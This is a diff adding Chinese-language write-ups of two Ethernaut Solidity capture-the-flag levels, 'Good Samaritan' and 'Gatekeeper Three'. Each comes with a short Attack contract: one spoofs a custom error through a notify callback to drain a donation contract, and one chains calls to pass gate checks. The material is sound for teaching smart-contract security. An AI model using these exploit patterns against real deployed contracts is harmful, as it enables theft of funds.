@@ -565,3 +565,38 @@ msgData的布局（相对于delegateTransfer函数）
 └─────────┴─────────┴───────────┴───────────┘
 ```
 这题叫DoubleEntryPoint是因为DoubleEntryPointToken既可以用自带的transfer进行转账，也可以通过LegacyToken委托调用转账
+
+## Good Samaritan
+
+提示给出了这篇文章： https://www.soliditylang.org/blog/2021/04/21/custom-errors 。稍微翻了一下，重要的地方只有最后那段`Errors in Depth`。revert一个error在内存得到的字节等于用abi函数编码error的名称，这也是`keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)`的由来
+
+如果一个函数抛出error，这个error会沿着函数调用栈一直往上走，直到遇见try-catch语句。所以我们利用transfer中调用的`INotifyable(dest_).notify(amount_)`在notify里抛出一样的错误即可
+```solidity
+contract Attack {
+    GoodSamaritan target=GoodSamaritan(address());
+    error NotEnoughBalance();
+    function exploit() public {
+        target.requestDonation();
+    }
+    function notify(uint256 amount) external { //注意transferRemainder也会调用transfer，不能无脑revert
+        if(amount<=10){
+            revert NotEnoughBalance();
+        }
+    }
+}
+```
+## Gatekeeper Three
+
+没有新东西，是之前见过的考点的大杂烩
+```solidity
+contract Attack {
+    GatekeeperThree target=GatekeeperThree(payable(address()));
+    constructor() payable {}
+    function exploit() public {
+        target.construct0r();
+        target.getAllowance(); //createTrick后看trick合约的storage得到
+        require(payable(target).send(0.001000001 ether), "Transaction failed");
+        target.enter();
+    }
+}
+```
